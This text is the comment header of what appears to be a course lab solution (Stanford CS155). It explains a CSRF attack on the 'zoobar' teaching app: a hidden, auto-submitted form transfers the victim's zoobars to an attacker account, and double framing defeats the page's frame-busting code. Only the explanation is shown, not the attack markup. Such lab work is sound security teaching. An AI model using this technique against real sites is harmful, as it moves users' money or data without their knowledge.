		<!-- Note: this attack works with the original version of transfer.php which includes framebusting defense code. -->

		<!-- Main idea of exploit:
			    This is a CSRF attack on zoobar. The victim will be assumed to have an active session with zoobar 
			    when visiting the attacker page (this HTML page). The attacker page has a form that will make a
			    post request to zoobar.stanford.edu/transfer.php with parameters to request a transfer of 10 
			    zoobars destined to the 'attacker' account. When the victim visits this page the form will be hidden, 
			    prefilled and automatically sent with JavaScript without victim action/awareness. The browser will
			    send the victim's session-authentication cookies along with the HTTP POST request and will result 
			    in a transfer of 10 zoobars from the victim's account to the attacker's. As soon as the post request
			    succeeds the page will be redirected to crypto.stanford.edu/cs155. This is so quick that the victim 
			    will believe he was only visiting crypto.stanford.edu/cs155.

			    There is one technical difficulty in this attack. The transfer.php file in zoobar contains frame 
			    busting code, which needs to be defeated. The defense is of the type:

				if(top.location != self.location){
                	parent.location = self.location;
        		}
				
				In order to defeat this defense we use the double framing attack described in:
				http://seclab.stanford.edu/websec/framebusting/framebust.pdf. We basically create a framewithin a 
				frame and have the post target be the doubly nested frame. The frame busting defense will fail there.
				We of course hide all of this from the user.
